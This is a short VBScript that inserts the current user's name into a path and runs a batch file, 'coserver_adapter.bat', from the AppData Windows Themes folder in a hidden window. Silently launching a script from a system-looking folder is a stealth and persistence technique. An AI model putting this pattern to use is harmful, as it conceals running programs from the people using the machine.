set ws=WScript.CreateObject("WScript.Shell") 
set network=WScript.CreateObject("Wscript.Network")
cmdtext="C:\Users\username\AppData\Roaming\Microsoft\Windows\Themes\coserver_adapter.bat /start"
cmd=Replace(Trim(cmdtext), "username", network.UserName)
ws.Run cmd,0 